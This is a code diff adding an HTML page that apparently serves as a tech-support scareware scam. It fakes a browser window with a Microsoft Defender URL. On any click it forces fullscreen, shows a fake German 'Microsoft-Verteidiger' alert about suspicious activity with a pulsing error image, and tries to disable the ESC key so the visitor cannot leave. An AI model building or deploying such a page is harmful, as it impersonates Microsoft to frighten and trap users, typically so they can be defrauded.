@@ -1,0 +1,217 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+    <title>Hello, world!</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer"
+    />
+</head>
+<style>
+    * {
+        color: rgb(79, 78, 78) !important;
+    }
+    
+    .navbar-nav li a {
+        border-top: 1px solid black;
+        border-left: 1px solid black;
+        border-right: 1px solid black;
+        border-radius: 6px;
+        font-size: small;
+    }
+    
+    .navbar-nav li {
+        width: 200px;
+        background-color: rgb(240, 240, 240);
+    }
+    
+    .navbar-nav .plus-icon {
+        width: 43px !important;
+        margin-left: 5px;
+        padding: 2px 3px;
+        text-align: center;
+        border-radius: 50%;
+    }
+    
+    .navbar-nav .plus-icon a {
+        border: none !important;
+    }
+    
+    .navbar-nav .plus-icon:hover {
+        background-color: #dfdfdf;
+    }
+    
+    .form-inline button {
+        padding: 7px 16px;
+    }
+    
+    .form-inline button:hover {
+        /* border: 1px solid gray; */
+        background-color: rgb(196, 193, 193);
+    }
+    
+    .form-inline .closex:hover {
+        background-color: rgb(233, 65, 65);
+    }
+    
+    nav {
+        padding: 0 !important;
+    }
+</style>
+<style>
+    .cont {
+        display: flex;
+        width: 100%;
+        justify-content: space-between;
+        padding: 2px 18px;
+        align-items: center;
+    }
+    
+    input[type="search"] {
+        height: 38px;
+        border-radius: 10px;
+        width: 1534px;
+        background-color: #eee;
+        border: none;
+        padding: 0px 20px;
+    }
+    
+    .main_page {
+        width: 100vw;
+        height: 100vh;
+        background-image: url("mpage.png");
+        background-repeat: no-repeat;
+    }
+    
+    @keyframes zoomInOut {
+        0% {
+            transform: scale(1);
+            /* Initial scale */
+        }
+        100% {
+            transform: scale(1.1);
+            /* Final scale */
+        }
+    }
+    
+    form a:hover {
+        background-color: #dfdfdf;
+    }
+    
+    form .cut:hover {
+        background-color: rgb(247, 70, 70)
+    }
+</style>
+
+<body style="position: relative;">
+
+    <nav class="navbar navbar-expand-lg ">
+
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+            <ul class="navbar-nav mr-auto">
+                <li class="nav-item active">
+                    <a class="nav-link" href="#">Microsoft Aufmerksamkeit !<span class="sr-only">(current)</span></a>
+                </li>
+
+                <li class="nav-item plus-icon">
+                    <a class="nav-link disabled" href="#" tabindex="-1" aria-disabled="true"><i class="fas fa-plus"></i></a>
+                </li>
+            </ul>
+            <form class="form-inline my-2 my-lg-0">
+                <a><i class="fas fa-minus  my-2 my-sm-0" style="margin:15px ; padding: 15px 0px;"></i></a>
+                <a><i class="far fa-window-maximize my-2 my-sm-0" style="margin:15px ; padding: 15px 0px;"></i></a>
+                <a class="cut"><i class="fas fa-times my-2 my-sm-0" style="margin:15px ; padding: 15px 0px;"></i></a>
+            </form>
+        </div>
+    </nav>
+
+    <div class="cont">
+        <div class="div1">
+            <i class="fa-solid fa-arrow-left"></i>
+            <i class="fa-solid fa-arrow-right" style="margin: 0px 20px;"></i>
+            <i class="fas fa-redo" style="margin: 0px 5px;"></i>
+        </div>
+        <div class="div2">
+            <input type="search" placeholder="https://www.microsoft.com/en-in/security/business/microsoft-defender-for-business-and-individuals-free-trial?ef_id=_k_CjwKCAjw5v2wBhBrEiwAXDDoJaNKCLMtQs7PXrv0ekzTqj0jLOe5beD7fJORWJ6O7HM6fycNuaLw0hoCwfEQAvD_BwE_k_&OCID=AIDcmmzhf6rma8_SEM__k_CjwKCAjw5v2wBhBrEiwAXDDoJaNKCLMtQs7PXrv0ekzTqj0jLOe5beD7fJORWJ6O7HM6fycNuaLw0hoCwfEQAvD_BwE_k_&gad_source=1&gclid=CjwKCAjw5v2wBhBrEiwAXDDoJaNKCLMtQs7PXrv0ekzTqj0jLOe5beD7fJORWJ6O7HM6fycNuaLw0hoCwfEQAvD_BwE">
+
+        </div>
+        <div class="div3">
+            <i class="far fa-user" style="margin: 0px 20px;"></i>
+            <i class="fas fa-ellipsis-v"></i>
+
+        </div>
+    </div>
+    <div class="main_page">
+    </div>
+    <div class="error_msg" style="background-color: rgb(41, 41, 41); width: 500px; position: absolute; top: 0; right: 0;  left: 0; margin: auto; padding: 10px 20px; display: none;">
+        <h3 style="color: red !important;">Microsoft-Verteidiger!</h3>
+        <p style="color: white !important; margin: 10px 0px 0px 0xp;">Verdächtig erkannt</p>
+        <p style="color: white !important;">Aufmerksamkeit von Microsoft aufgrund ungewöhnlicher Aktivitäten</p>
+    </div>
+    <div class="error_msg2" style="position: absolute; top: 30%; left: 30%; transform: translate(0, -50%); animation: zoomInOut 0.5s infinite alternate; display: none; ">
+        <img src="error.png" alt="" width="750px" height="600px" style="border: 1px solid rgb(185, 185, 185);">
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/js/all.min.js" integrity="sha512-u3fPA7V8qQmhBPNT5quvaXVa1mnnLSXUep5PS1qo5NRzHwG19aHmNJnj1Q8hpA/nBWZtZD4r4AX6YOt5ynLN2g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script>
+        // Function to request fullscreen
+        function requestFullscreen() {
+            var elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.mozRequestFullScreen) { /* Firefox */
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { /* IE/Edge */
+                elem.msRequestFullscreen();
+            }
+        }
+
+        // Request fullscreen on click
+        document.addEventListener('click', function() {
+            requestFullscreen();
+            disableEscKey(event);
+        });
+
+        // Function to show error message
+        function showError() {
+            var errorMessage = document.querySelector('.error_msg');
+            var errorMessage2 = document.querySelector('.error_msg2');
+            errorMessage.style.display = 'block';
+            errorMessage2.style.display = 'block';
+        }
+
+        // Add event listener to the document body to show error message on click
+        document.body.addEventListener('click', showError);
+    </script>
+
+    <script>
+        function disableEscKey(event) {
+            if (event.keyCode === 27) { // 27 is the keycode for ESC key
+                event.preventDefault(); // Prevent the default action of ESC key
+                // You can add any custom action here if needed
+                console.log("ESC key is disabled.");
+            }
+        }
+
+        // Add keydown event listener to the document
+        document.addEventListener("keydown", disableEscKey);
+    </script>
+</body>
+
+</html>
